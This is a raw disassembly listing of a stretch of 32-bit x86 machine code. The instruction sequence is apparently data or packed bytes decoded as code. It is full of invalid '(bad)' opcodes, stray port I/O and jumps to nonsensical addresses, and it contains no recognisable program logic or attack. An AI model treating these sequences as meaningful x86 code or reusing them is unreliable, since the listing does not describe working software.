  412080:	ins    BYTE PTR es:[edi],dx
  412081:	inc    ecx
  412082:	or     dl,ah
  412084:	out    dx,al
  412085:	nop
  412086:	xor    BYTE PTR [edi-0x4e59bd85],al
  41208c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41208d:	push   edi
  41208e:	push   es
  41208f:	mov    dl,0xd3
  412091:	mov    al,ds:0x835d465e
  412096:	push   0xa4e298f0
  41209b:	(bad)  
  41209c:	(bad)  
  41209d:	lods   al,BYTE PTR ds:[esi]
  41209e:	add    BYTE PTR [esi+0x1b],bh
  4120a1:	call   0xaf21:0x4db83c84
  4120a8:	pop    es
  4120a9:	xchg   BYTE PTR [eax+0x57127ca4],ch
  4120af:	jecxz  0x41203d
  4120b1:	mov    eax,ds:0x306a6a6
  4120b6:	mov    dl,0xf1
  4120b8:	mov    ebx,0x973f8ba5
  4120bd:	repnz bound edi,QWORD PTR [ebp-0x5f]
  4120c1:	mov    ecx,0x96f6c971
  4120c6:	out    dx,al
  4120c7:	sti    
  4120c8:	fcom   DWORD PTR [edi-0x1a]
  4120cb:	jae    0x4120ee
  4120cd:	mov    esp,0x5fc66bbd
  4120d2:	loope  0x4120a9
  4120d4:	xchg   BYTE PTR [ebp+0x7d],al
  4120d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120d8:	add    al,0x30
  4120da:	popf   
  4120db:	push   0x9a81d1d
  4120e0:	push   esi
  4120e1:	pop    ecx
  4120e2:	jge    0x412087
  4120e4:	add    eax,0x919408a5
  4120e9:	add    al,0x73
  4120eb:	arpl   WORD PTR [eax],dx
  4120ed:	push   edx
  4120ee:	mov    ch,0x4b
  4120f0:	mov    dl,0xfc
  4120f2:	jp     0x41211c
  4120f4:	xchg   edx,eax
  4120f5:	div    BYTE PTR [eax]
  4120f7:	cli    
  4120f8:	pop    ebp
  4120f9:	retf   0x27e9
  4120fc:	into   
  4120fd:	or     ebp,esi
  4120ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412100:	aas    
  412101:	ret    
  412102:	out    0xf2,eax
  412104:	jge    0x4120d1
  412106:	mov    esp,0xd54bf0e7
  41210b:	in     eax,0x14
  41210d:	test   BYTE PTR [ebp-0x7d1d17e5],0xa1
  412114:	lock lods al,BYTE PTR ds:[esi]
  412116:	cmp    eax,0x3b9f4c09
  41211b:	inc    edx
  41211c:	cmp    bl,BYTE PTR ds:0x78ca9c19
  412122:	or     DWORD PTR [eax-0x6f],edx
  412125:	push   esp
  412126:	cld    
  412127:	push   es
  412128:	mov    ebx,0xc84d5c82
  41212d:	jg     0x412167
  41212f:	mov    esp,0xd2211ed9
  412134:	xor    al,0x60
  412136:	mov    bl,0x46
  412138:	(bad)  
  412139:	aam    0xe3
  41213b:	popf   
  41213c:	bound  esi,QWORD PTR [ecx+0x77]
  41213f:	stos   DWORD PTR es:[edi],eax
  412140:	jno    0x412172
  412142:	scas   al,BYTE PTR es:[edi]
  412143:	out    0x80,eax
  412145:	(bad)  
  412146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412147:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  412149:	jbe    0x4121a0
  41214b:	inc    si
  41214d:	ret    
  41214e:	(bad)
  412152:	nop
  412153:	mov    ds:0xaccee95f,al
  412158:	and    BYTE PTR [edi-0x66],dh
  41215b:	mov    dh,0x4a
  41215d:	cli    
  41215e:	mov    ss,WORD PTR [edx+0x297e3917]
  412164:	xchg   ebx,eax
  412165:	sub    DWORD PTR ds:0x6ffb1bef,edx
  41216b:	xor    cl,BYTE PTR [eax+0x78]
  41216e:	mov    dh,0xbb
  412170:	dec    esp
  412171:	lods   al,BYTE PTR ds:[esi]
  412172:	sbb    al,0x7b
  412175:	and    BYTE PTR [edx],dl
  412177:	push   0xb08f522a
  41217c:	scas   al,BYTE PTR es:[edi]
  41217d:	mov    eax,0x1f608c28
  412182:	js     0x4121e7
  412184:	mov    eax,ds:0x311b1b68
  412189:	and    eax,0xe32be94a
  41218e:	inc    ebp
  41218f:	or     esi,DWORD PTR [edi-0x2fccaa20]
  412195:	push   esp
  412196:	add    esi,DWORD PTR [esi-0x4a8ca71c]
  41219c:	xor    al,0xef
  41219e:	icebp  
  41219f:	sbb    edi,ecx
  4121a1:	and    BYTE PTR [ebp-0x2d323e0a],ch
  4121a7:	xor    eax,0x45fc2adb
  4121ac:	(bad)  
  4121ad:	aad    0x1
  4121af:	inc    eax
  4121b0:	inc    esp
  4121b1:	dec    esp
  4121b2:	ss and eax,0x9aee55ef
  4121b8:	cli    
  4121b9:	leave  
  4121ba:	xor    al,0x9f
  4121bc:	mov    dh,0xfb
  4121be:	xchg   ebx,eax
  4121bf:	mov    esp,0x51ea974c
  4121c4:	inc    ecx
  4121c5:	inc    ebp
  4121c6:	aam    0xeb
  4121c8:	jle    0x41223d
  4121ca:	jnp    0x4121bd
  4121cc:	addr16 xor al,0xe7
  4121cf:	jmp    0x41216c
  4121d1:	push   esp
  4121d2:	out    0xf2,al
  4121d4:	dec    esp
  4121d5:	jb     0x412186
  4121d7:	iret   
  4121d8:	popa   
  4121d9:	cmp    BYTE PTR [edi-0x654e7d86],dh
  4121df:	adc    eax,0x7979085
  4121e4:	nop
  4121e5:	jae    0x4121b6
  4121e7:	pushf  
  4121e8:	fstp   DWORD PTR [ecx-0x66]
  4121eb:	mov    ebx,0x40b24320
  4121f0:	cmp    eax,0x192c8da4
  4121f5:	xor    bh,0x8e
  4121f8:	and    BYTE PTR [ecx-0x70d18949],bl
  4121fe:	cmc    
  4121ff:	inc    esi
  412200:	bswap  edi
  412202:	jne    0x41220f
  412204:	dec    ebp
  412205:	leave  
  412206:	xchg   esi,eax
  412207:	ins    BYTE PTR es:[edi],dx
  412208:	and    eax,0xd82af092
  41220d:	scas   al,BYTE PTR es:[edi]
  41220e:	ins    BYTE PTR es:[edi],dx
  41220f:	iret   
  412210:	jmp    0x9737a346
  412215:	repz adc al,BYTE PTR [ecx+0x53da20bf]
  41221c:	loopne 0x4121d6
  41221e:	in     al,dx
  41221f:	(bad)  
  412223:	dec    esp
  412224:	jmp    0x412275
  412226:	mov    dh,0x65
  412228:	pop    ebx
  412229:	lea    edx,fs:[ecx-0x61fb6ace]
  412230:	dec    ecx
  412231:	out    dx,al
  412232:	adc    dl,ah
  412234:	adc    dh,dh
  412236:	mov    edi,DWORD PTR [ebp+0x1]
  412239:	xchg   DWORD PTR [ecx],eax
  41223b:	add    DWORD PTR [ecx-0x3da49644],0x32269c00
  412245:	and    esp,esi
  412247:	cwde   
  412248:	jns    0x412284
  41224a:	cwde   
  41224b:	push   eax
  41224c:	(bad)  
  41224d:	lds    edi,FWORD PTR [ecx+0x56]
  412250:	jne    0x4121d8
  412252:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412253:	outs   dx,DWORD PTR ds:[esi]
  412254:	(bad)  
  412255:	es mov ebx,0x2cb8888f
  41225b:	je     0x412271
  41225d:	sbb    al,0xef
  41225f:	sbb    BYTE PTR [ebp-0x6],0xfb
  412263:	jge    0x41228d
  412265:	dec    ebp
  412266:	fld    QWORD PTR [ebx+ebx*1]
  412269:	lock adc ecx,DWORD PTR [eax]
  41226c:	sbb    DWORD PTR [edx+0x43],edi
  41226f:	sub    eax,0x15c32280
  412274:	xchg   BYTE PTR [ecx+0x57d538f5],cl
  41227a:	test   al,0xe6
  41227c:	adc    al,0xe5
  41227e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41227f:	inc    edx
  412280:	jno    0x41227e
  412282:	rol    BYTE PTR [eax],0x3a
  412285:	push   eax
  412286:	push   ds
  412287:	pop    esi
  412288:	data16 mov ah,0xc6
  41228b:	pop    esi
  41228c:	cli    
  41228d:	xor    DWORD PTR ds:0x88d2f945,ecx
  412293:	test   esp,ebp
  412295:	ss loop 0x412253
  412298:	xor    DWORD PTR [edx-0x63],0x692eaeb8
  41229f:	adc    DWORD PTR [eax+0x79],edx
  4122a2:	mov    eax,ds:0x231c5fa7
  4122a7:	jbe    0x41227e
  4122a9:	xchg   edx,eax
  4122aa:	daa    
  4122ab:	xchg   edx,eax
  4122ac:	fdivrp st(5),st
  4122ae:	leave  
  4122af:	push   ecx
  4122b0:	les    ebp,FWORD PTR [eax-0x55]
  4122b3:	in     eax,dx
  4122b4:	fmul   QWORD PTR [esi+0x5ade4f21]
  4122ba:	(bad)  
  4122bb:	push   ecx
  4122bc:	das    
  4122bd:	out    dx,al
  4122be:	fdiv   QWORD PTR [esi+0x7e]
  4122c1:	add    eax,0xb38602d8
  4122c6:	clc    
  4122c7:	lds    edx,FWORD PTR [eax+ebp*8+0x2d]
  4122cb:	ror    DWORD PTR [edi+edx*2+0x461aca80],1
  4122d2:	xchg   esi,eax
  4122d3:	(bad)  
  4122d4:	imul   ebx,DWORD PTR [edi+0x60],0xfffffffb
  4122d8:	cmp    ebx,DWORD PTR [edi+0x1108d00b]
  4122de:	sbb    al,0x12
  4122e0:	fstp   QWORD PTR [ebx]
  4122e2:	mov    bl,0x31
  4122e4:	fstp   TBYTE PTR ds:0xc8918ff4
  4122ea:	out    0xf7,eax
  4122ec:	cld    
  4122ed:	sbb    al,0x66
  4122ef:	dec    esp
  4122f0:	push   eax
  4122f1:	add    eax,0x4ec2f897
  4122f6:	fcmovu st,st(2)
  4122f8:	jmp    0xbc4877ac
  4122fd:	ret    0x1a02
  412300:	cld    
  412301:	int3   
  412302:	pop    ds
  412303:	daa    
  412304:	sbb    edi,DWORD PTR [ebp-0x6c]
  412307:	sub    eax,0xeae1536c
  41230c:	push   edi
  41230d:	pop    ecx
  41230e:	xor    eax,0x72865355
  412313:	data16 and al,0x3b
  412316:	add    cl,BYTE PTR [eax+0x64212c27]
  41231c:	lock add esi,esp
  41231f:	push   ds
  412320:	mov    bl,BYTE PTR [edx+0x30]
  412323:	jl     0x4122fa
  412325:	fsubr  QWORD PTR [esi]
  412327:	out    0x10,eax
  412329:	inc    edx
  41232a:	and    DWORD PTR [ebp+0x6b],esp
  41232d:	cmc    
  41232e:	push   ss
  41232f:	xchg   DWORD PTR [eax],ebp
  412331:	mov    edx,0x65c6aba2
  412336:	imul   ecx,DWORD PTR [ebx+edi*1+0x16],0xffffff8d
  41233b:	and    cl,bl
  41233d:	popa   
  41233e:	inc    edx
  41233f:	call   0x3cdca3a3
  412344:	shr    BYTE PTR [ebx-0x5b7a0745],1
  41234a:	xchg   esi,eax
  41234b:	push   esi
  41234c:	sub    eax,0x72c47384
  412351:	outs   dx,BYTE PTR ds:[esi]
  412352:	jge    0x4123be
  412354:	shl    DWORD PTR [edx+0x4e70b98a],1
  41235a:	es repz mov al,0xab
  41235e:	jne    0x4122fb
  412360:	cld    
  412361:	fwait
  412362:	daa    
  412363:	inc    ebp
  412364:	iret   
  412365:	rcl    esi,0x7b
  412368:	rcl    ecx,0x12
  41236b:	and    DWORD PTR [esi+ebp*2-0x63],ecx
  41236f:	imul   eax,DWORD PTR [eax],0x74
  412372:	xor    DWORD PTR [ebx+0x191ca94b],ebx
  412378:	bound  eax,QWORD PTR [esi*1-0x6f3d9609]
  41237f:	push   esi
  412380:	repz mov bh,BYTE PTR [eax-0x4c]
  412384:	std    
  412385:	dec    ebp
  412386:	mov    cl,0x6b
  412388:	xor    al,0xfe
  41238a:	sub    eax,0x95cc383d
  41238f:	dec    esi
  412390:	retf   0xd4b2
  412393:	or     edx,DWORD PTR [eax-0xd3feffe]
  412399:	(bad)  
  41239a:	in     eax,dx
  41239b:	mov    bh,0x10
  41239d:	cmp    DWORD PTR [ecx-0x34d2af3],edx
  4123a3:	hlt    
  4123a4:	call   0x234b742b
  4123a9:	sbb    al,0x8
  4123ab:	(bad)  
  4123ac:	(bad)  
  4123ad:	mov    ebx,0x534c477
  4123b2:	pop    ds
  4123b3:	hlt    
  4123b4:	mov    ecx,fs
  4123b6:	jnp    0x412365
  4123b8:	push   esp
  4123b9:	test   eax,0x1010931b
  4123be:	push   ebp
  4123bf:	(bad)
  4123c2:	dec    ebx
  4123c3:	push   ds
  4123c4:	pusha  
  4123c5:	inc    esp
  4123c6:	pop    ebp
  4123c7:	int3   
  4123c8:	push   0x8e2792aa
  4123cd:	xor    dl,BYTE PTR [ecx-0x309ad375]
  4123d3:	leave  
  4123d4:	in     eax,0x65
  4123d6:	aam    0xd4
  4123d8:	js     0x41242d
  4123da:	jb     0x412407
  4123dc:	push   edx
  4123dd:	dec    eax
  4123de:	call   DWORD PTR [edi+0x7ca119d]
  4123e4:	inc    ebp
  4123e5:	sahf   
  4123e6:	jns    0x4123f4
  4123e8:	fdivr  DWORD PTR [ecx]
  4123ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123eb:	loope  0x41244f
  4123ed:	pop    ds
  4123ee:	xchg   ecx,eax
  4123ef:	bound  eax,QWORD PTR [ebp+0xc]
  4123f2:	dec    esp
  4123f3:	sub    BYTE PTR [eax],dl
  4123f5:	or     DWORD PTR [ebx+0x7c],ebx
  4123f8:	pop    ds
  4123f9:	adc    eax,0xeb02f64d
  4123fe:	loop   0x412421
  412400:	cmp    eax,0xbc67a0d2
  412405:	leave  
  412406:	cdq    
  412407:	scas   al,BYTE PTR es:[edi]
  412408:	cli    
  412409:	mov    ch,0x90
  41240b:	shl    ebp,0x2e
  41240e:	push   cs
  41240f:	cwde   
  412410:	ja     0x412408
  412412:	loop   0x4123ee
  412414:	mov    cl,0xf7
  412416:	mov    edi,0x6d60089e
  41241b:	mov    al,0x29
  41241d:	es sub eax,0xc0bc78cc
  412423:	lock mov bh,0x58
  412426:	inc    ebp
  412427:	push   ebp
  412428:	fist   DWORD PTR ds:0x9b368d79
  41242e:	bound  ecx,QWORD PTR [esi-0x27]
  412431:	push   eax
  412432:	and    DWORD PTR [edi-0x5a7479da],edx
  412438:	pop    edx
  412439:	aas    
  41243a:	sub    BYTE PTR [eax-0x61278035],ch
  412440:	sbb    eax,0xb75c5fde
  412445:	inc    edx
  412446:	add    bh,dh
  412448:	jmp    0x577b3611
  41244d:	imul   ebp,ebp,0xffffffaa
  412450:	repz mov bl,bl
  412453:	inc    esp
  412454:	scas   al,BYTE PTR es:[edi]
  412455:	and    edi,DWORD PTR ds:0x4c9f580b
  41245b:	frstor [esp+edx*2+0xc3fb278]
  412462:	inc    eax
  412463:	imul   ebp,DWORD PTR [ebx],0xffffffb4
  412466:	jmp    0x4df2296b
  41246b:	jns    0x41240c
  41246d:	sbb    al,0x71
  41246f:	mov    al,ds:0xb9bc4a63
  412474:	dec    edx
  412475:	pushf  
  412476:	int3   
  412477:	mov    ah,0x6
  412479:	add    edx,esi
  41247b:	pop    edx
  41247c:	inc    ecx
  41247d:	and    ebx,DWORD PTR [edx]
  41247f:	dec    ecx
  412480:	mov    eax,0x83f5e0ff
  412485:	mov    al,ds:0x4c575717
  41248a:	ds sti 
  41248c:	cwde   
  41248d:	je     0x41250e
  41248f:	in     eax,0x69
  412491:	lock lahf 
  412493:	je     0x4124a6
  412495:	jmp    0x23bf:0xd744c2a2
  41249c:	mov    ebp,0x2f667867
  4124a1:	jbe    0x4124fe
  4124a3:	mov    al,0x24
  4124a5:	xchg   edx,eax
  4124a6:	xchg   ebp,eax
  4124a7:	lahf   
  4124a8:	xchg   esi,eax
  4124a9:	cmp    BYTE PTR [edx+0x3d],dh
  4124ac:	shl    DWORD PTR [edi],0x18
  4124af:	jmp    0x24e:0x9e1b8a4a
  4124b6:	ret    0x33f7
  4124b9:	and    eax,0xd485c834
  4124be:	push   0x4a
  4124c0:	mov    bh,0x6f
  4124c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124c3:	push   ecx
  4124c4:	call   0xf2df0de2
  4124c9:	(bad)  
  4124ca:	adc    BYTE PTR ds:0x8be6c77a,dh
  4124d0:	call   0x61be:0xea636448
  4124d7:	push   edx
  4124d9:	or     al,0x98
  4124db:	cdq    
  4124dc:	xor    ch,cl
  4124de:	in     al,0xb8
  4124e0:	or     edi,ebp
  4124e2:	loope  0x41255d
  4124e4:	add    al,0xa4
  4124e6:	inc    esp
  4124e7:	xor    eax,0xf6278812
  4124ec:	sub    ebp,edi
  4124ee:	or     ecx,DWORD PTR [ecx+0x4a]
  4124f1:	cmp    ebp,ebx
  4124f3:	stos   BYTE PTR es:[edi],al
  4124f4:	mov    ebp,0x88b25146
  4124f9:	inc    esi
  4124fa:	cdq    
  4124fb:	sub    eax,ecx
  4124fd:	mov    dh,0xa0
  4124ff:	or     eax,0xb21294a8
  412504:	loope  0x41252f
  412506:	adc    DWORD PTR [edx+edi*8+0x3fb9ad52],edx
  41250d:	jnp    0x41254b
  41250f:	sub    ch,BYTE PTR [edx]
  412511:	push   cs
  412512:	imul   ecx,DWORD PTR [ebx+0x60],0xffffffc6
  412516:	xor    edi,eax
  412518:	mov    edx,0x1b8b42a4
  41251d:	stos   DWORD PTR es:[edi],eax
  41251e:	pop    esi
  41251f:	test   BYTE PTR [eax],dh
  412521:	push   esi
  412522:	out    dx,al
  412523:	rcr    ebp,cl
  412525:	rol    DWORD PTR [edi-0xf636e3c],0x6e
  41252c:	ins    DWORD PTR es:[edi],dx
  41252d:	jp     0x41259e
  41252f:	mov    BYTE PTR [eax-0x69cb8f11],al
  412535:	push   0x20
  412537:	or     eax,DWORD PTR [edx+0x45832a59]
  41253d:	push   ebx
  41253e:	mov    dh,0x50
  412540:	or     DWORD PTR [edx+0x4c4e07ec],esi
  412546:	sub    eax,0x5e67afc4
  41254b:	mov    bh,0xf6
  41254d:	and    ah,BYTE PTR [eax*8+0x3c2d78d1]
  412554:	pop    esi
  412555:	(bad)  
  412557:	test   eax,0x5884293f
  41255c:	ss inc edx
  41255e:	jae    0x41252d
  412560:	popa   
  412561:	xchg   ecx,eax
  412562:	test   BYTE PTR [esi-0x80],bh
  412565:	in     eax,0x2e
  412567:	xchg   ecx,eax
  412568:	cmp    al,0xe9
  41256a:	retf   0x7129
  41256d:	bound  ebp,QWORD PTR [ecx+0xc]
  412570:	cwde   
  412571:	mov    ds:0x84c79cb3,al
  412576:	dec    ecx
  412577:	iret   
  412578:	js     0x412524
  41257a:	or     esi,eax
  41257c:	fbstp  TBYTE PTR [ecx+0x7a]
  41257f:	jge    0x41259e
  412581:	mov    ds:0xcafd9128,eax
  412586:	ds dec edi
  412588:	aas    
  412589:	in     al,0x5c
  41258b:	jl     0x412565
  41258d:	test   ebx,edx
  41258f:	rcr    ecx,cl
  412591:	lods   al,BYTE PTR ds:[esi]
  412592:	xor    esi,DWORD PTR [edi]
  412594:	xchg   BYTE PTR [esi-0x5995d021],bh
  41259a:	sbb    esi,eax
  41259c:	xor    al,0x95
  41259e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41259f:	inc    edi
  4125a0:	(bad)  
  4125a1:	push   eax
  4125a2:	ins    DWORD PTR es:[edi],dx
  4125a3:	das    
  4125a4:	push   ebp
  4125a5:	loope  0x41260c
  4125a7:	push   esi
  4125a8:	jb     0x412600
  4125aa:	sub    DWORD PTR [edx],edx
  4125ac:	xor    bl,BYTE PTR [edi-0xf]
  4125af:	cli    
  4125b0:	xchg   DWORD PTR [ebp+0x4afc2d4],ebx
  4125b6:	inc    ebx
  4125b7:	(bad)  
  4125b9:	mov    esp,0x10085acf
  4125be:	mov    ecx,0xf40ffbd0
  4125c3:	in     eax,dx
  4125c4:	xchg   BYTE PTR [eax-0x41054f54],ah
  4125ca:	add    eax,0x6654dd7a
  4125cf:	sbb    al,0x64
  4125d1:	lahf   
  4125d2:	or     eax,0x4b132a66
  4125d7:	fwait
  4125d8:	xchg   edi,eax
  4125d9:	mov    cl,BYTE PTR [esi+0x7b80d65b]
  4125df:	repz inc esp
  4125e1:	imul   eax,DWORD PTR [ecx],0xffffffbb
  4125e4:	and    al,0x1d
  4125e6:	(bad)  
  4125e7:	(bad)  ds:0x6a3fc471
  4125ed:	leave  
  4125ee:	(bad)  
  4125ef:	sub    eax,0xb572df1e
  4125f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125f5:	cmp    ah,BYTE PTR [ebx-0x1f6d15e6]
  4125fb:	push   esp
  4125fc:	(bad)  
  4125fd:	jecxz  0x4125bb
  4125ff:	push   ss
  412600:	ret    0x7b19
  412603:	not    DWORD PTR [edx+0x1d10cf89]
  412609:	adc    BYTE PTR [ebx],dl
  41260b:	mov    esp,0x2e2fc955
  412610:	cld    
  412611:	sub    esp,ebp
  412613:	imul   ebp,edx,0xe453791d
  412619:	and    eax,0xf10511c5
  41261e:	fmul   DWORD PTR [edx]
  412620:	div    BYTE PTR [edx-0x3b9245f7]
  412626:	test   eax,0x2533b2ff
  41262b:	jmp    0x481826e6
  412630:	fidiv  WORD PTR [edx]
  412632:	add    DWORD PTR [edx-0x25],esp
  412635:	out    dx,eax
  412636:	gs jae 0x41267f
  412639:	fst    QWORD PTR [esi-0x21]
  41263c:	xchg   ebx,eax
  41263d:	pop    esp
  41263e:	pop    ds
  41263f:	sub    eax,0xaa1affda
  412644:	push   edi
  412645:	pusha  
  412646:	mov    dh,BYTE PTR [esi-0x64]
  412649:	push   edx
  41264a:	adc    ch,BYTE PTR [edi+0x44cc9388]
  412650:	inc    ebp
  412651:	gs dec ebp
  412653:	push   es
  412654:	cli    
  412655:	sbb    eax,0xf7f1436
  41265a:	and    DWORD PTR [ebp+0x67],ecx
  41265d:	repnz mov esp,0x3ae1f190
  412663:	xchg   ebx,eax
  412664:	inc    edx
  412665:	ins    DWORD PTR es:[edi],dx
  412666:	retf   
  412667:	clc    
  412668:	mov    WORD PTR [ebp-0x61],fs
  41266b:	mov    eax,ds:0x911403a7
  412671:	rcr    BYTE PTR [ebp-0x6eb74fc2],0x85
  412678:	(bad)  
  412679:	push   edi
  41267a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41267b:	add    ch,bl
  41267d:	aas    
  41267e:	sbb    ecx,0xdb38a74
  412684:	(bad)  
  412685:	jbe    0x4126a1
  412687:	and    esi,esp
  412689:	int3   
  41268a:	ret    
  41268b:	repnz inc esp
  41268d:	retf   
  41268e:	shr    BYTE PTR [ebp-0x716e22cb],cl
  412694:	enter  0xd53b,0xb2
  412698:	into   
  412699:	mov    esp,0xecbc8324
  41269e:	inc    esp
  41269f:	or     eax,0x7f9d66c4
  4126a4:	pop    ebx
  4126a5:	sbb    eax,0x7dfe942a
  4126aa:	jle    0x412722
  4126ac:	sub    eax,DWORD PTR [edi+eax*1-0xe54a6f6]
  4126b3:	mov    ds:0xaee143c3,al
  4126b8:	mov    eax,0x7844a902
  4126bd:	add    al,0x43
  4126bf:	rcl    DWORD PTR ds:[eax],cl
  4126c2:	cli    
  4126c3:	pop    esi
  4126c4:	mov    esp,0x4b69bb5c
  4126c9:	jno    0x412653
  4126cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126cc:	jge    0x4126ea
  4126ce:	in     eax,0xf9
  4126d0:	arpl   si,si
  4126d2:	pusha  
  4126d3:	cs hlt 
  4126d5:	jle    0x41265a
  4126d7:	popa   
  4126d8:	pop    ss
  4126d9:	jecxz  0x412715
  4126db:	out    dx,al
  4126dc:	and    al,0xd0
  4126de:	int    0xd4
  4126e0:	and    ecx,DWORD PTR [edi]
  4126e2:	pop    ds
  4126e3:	ret    0xb12b
  4126e6:	fcmovu st,st(7)
  4126e8:	jmp    0x412685
  4126ea:	push   ebx
  4126eb:	js     0x41272d
  4126ed:	pop    eax
  4126ee:	ret    
  4126ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126f0:	xchg   ch,dh
  4126f2:	or     DWORD PTR [ecx+0x4c04c5ac],0x9c390d81
  4126fc:	xor    al,0xf2
  4126fe:	sti    
  4126ff:	mov    dl,BYTE PTR [ecx-0x6591b0cb]
  412705:	push   cs
  412706:	add    al,0x2f
  412708:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412709:	leave  
  41270a:	stos   BYTE PTR es:[edi],al
  41270b:	out    0x9,al
  41270d:	pop    ecx
  41270e:	inc    edi
  41270f:	pop    edx
  412710:	and    eax,DWORD PTR ds:0x8ccd3a39
  412716:	mov    eax,ds:0xd474c24c
  41271b:	into   
  41271c:	enter  0x490f,0x9
  412720:	stos   DWORD PTR es:[edi],eax
  412721:	and    al,0x2d
  412723:	shr    DWORD PTR [esi+edi*4-0x4e9bcdb5],cl
  41272a:	jnp    0x4126fd
  41272c:	mov    cl,0x24
  41272e:	cwde   
  41272f:	fistp  QWORD PTR [esi+ecx*8+0x5a269611]
  412736:	std    
  412737:	inc    ebx
  412738:	sub    ah,dl
  41273a:	push   0x23
  41273c:	rol    BYTE PTR [ebp+0x62071ef6],1
  412742:	cs mov bl,0xc4
  412745:	jns    0x41275f
  412747:	int3   
  412748:	pop    edx
  412749:	daa    
  41274a:	mov    ebx,DWORD PTR [ecx-0x7b]
  41274d:	scas   al,BYTE PTR es:[edi]
  41274e:	pop    es
  41274f:	pop    ebx
  412750:	jl     0x412710
  412752:	mov    esi,ebp
  412754:	mov    ebx,0x9a4c7a85
  412759:	mov    bh,0xa2
  41275b:	fild   DWORD PTR [esi]
  41275d:	xchg   esp,eax
  41275e:	mov    eax,0x9c109fdc
  412763:	pop    edx
  412764:	fist   WORD PTR [ecx+0x132bfcd4]
  41276a:	sar    ch,0xc
  41276d:	push   es
  41276e:	addr16 cmp eax,0x8a43f3c3
  412774:	adc    eax,0x545b99ee
  412779:	retf   0xcd5c
  41277c:	inc    esi
  41277d:	or     bh,BYTE PTR [edx]
  41277f:	add    DWORD PTR [ebx-0x582c9ea9],esi
  412785:	je     0x4127b2
  412787:	cli    
  412788:	mov    edi,0x75306158
  41278d:	lahf   
  41278e:	xor    ebp,DWORD PTR [ebx]
  412790:	push   cs
  412791:	jmp    0xdbf06f2c
  412796:	addr16 out dx,al
  412798:	and    DWORD PTR [edx+ebx*8-0x57],ebx
  41279c:	add    BYTE PTR [ebp+0xb],bl
  41279f:	mov    esi,0x1367568c
  4127a4:	mov    eax,0xdeb83ce9
  4127a9:	xchg   edi,eax
  4127aa:	mov    cl,0x7b
  4127ac:	or     bh,ch
  4127ae:	inc    ecx
  4127af:	call   0xf43e99e7
  4127b4:	sub    BYTE PTR [esi-0x14],dh
  4127b7:	es xchg esi,eax
  4127b9:	xor    eax,0xae498e16
  4127be:	test   eax,0x96bc54a5
  4127c3:	xor    dh,BYTE PTR [edx+eax*4]
  4127c6:	jbe    0x4127e1
  4127c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127c9:	test   BYTE PTR [ebx],0x43
  4127cc:	ret    
  4127cd:	cld    
  4127ce:	xchg   ecx,eax
  4127cf:	cld    
  4127d0:	mul    DWORD PTR [esi-0x3d33a8ca]
  4127d6:	pusha  
  4127d7:	out    0x96,eax
  4127d9:	dec    ebx
  4127da:	aad    0xa5
  4127dc:	or     BYTE PTR [esi],0x58
  4127df:	leave  
  4127e0:	mov    DWORD PTR [esp+ebp*4],0x4e1c4608
  4127e7:	fstp   TBYTE PTR [eax-0x6b52b27a]
  4127ed:	mov    ch,0x5f
  4127ef:	xchg   edi,edx
  4127f1:	sub    ch,BYTE PTR [ecx+0x54281e92]
  4127f7:	enter  0xc69,0x1e
  4127fb:	inc    ecx
  4127fc:	dec    ebx
  4127fd:	xor    BYTE PTR [ecx],bl
  4127ff:	push   edi
  412800:	xor    ecx,DWORD PTR [edi+0x36]
  412803:	sub    eax,0x2551b9b4
  412808:	pop    ebp
  412809:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41280a:	test   BYTE PTR [ebx+0x1d51ca0],ah
  412810:	or     DWORD PTR [edx],esi
  412812:	or     eax,0x4ade88
  412817:	adc    dl,cl
  412819:	xchg   ebp,eax
  41281b:	cs jnp 0x41288f
  41281e:	out    dx,eax
  41281f:	inc    esp
  412820:	jl     0x4127a4
  412822:	push   edi
  412823:	cmp    eax,0x5c105024
  412828:	add    edi,DWORD PTR [esi+0x0]
  41282b:	jmp    FWORD PTR [ebp-0x11eb0d21]
  412831:	das    
  412832:	xchg   ecx,eax
  412833:	jmp    FWORD PTR [edi+0x5e]
  412836:	cmovg  edi,DWORD PTR [ebx-0x33fb0839]
  41283d:	mov    ah,0x56
  41283f:	push   cs
  412840:	leave  
  412841:	mov    eax,0xe2bf5d0b
  412846:	outs   dx,BYTE PTR ds:[esi]
  412847:	adc    al,0xa0
  412849:	adc    DWORD PTR [ecx-0xf],ebp
  41284c:	outs   dx,DWORD PTR ds:[esi]
  41284d:	cdq    
  41284e:	(bad)  
  41284f:	jns    0x4127d3
  412851:	outs   dx,DWORD PTR ds:[esi]
  412852:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412853:	mov    dl,0x86
  412855:	loop   0x412864
  412857:	and    dl,BYTE PTR [ebp-0x579607d4]
  41285d:	jg     0x412878
  41285f:	fld    TBYTE PTR [ecx+0x0]
  412862:	adc    esp,ebx
  412864:	push   ebx
  412865:	pushf  
  412866:	retf   
  412867:	clc    
  412868:	(bad)  [ebp+0x75]
  41286b:	inc    ecx
  41286c:	push   ss
  41286d:	pop    ebp
  41286e:	test   eax,0x2a9b2958
  412873:	neg    DWORD PTR [ebp+0x12839ddb]
  412879:	pop    edx
  41287a:	xchg   esp,eax
  41287b:	mov    al,ds:0x9c2f6942
  412880:	fisubr WORD PTR [ecx]
  412882:	and    cl,bh
  412884:	mov    ecx,0x1a3a5e93
  412889:	xor    al,0x3d
  41288b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41288c:	in     al,dx
  41288d:	hlt    
  41288e:	sub    DWORD PTR [edx],0xffffff83
  412891:	in     eax,dx
  412892:	loope  0x41285a
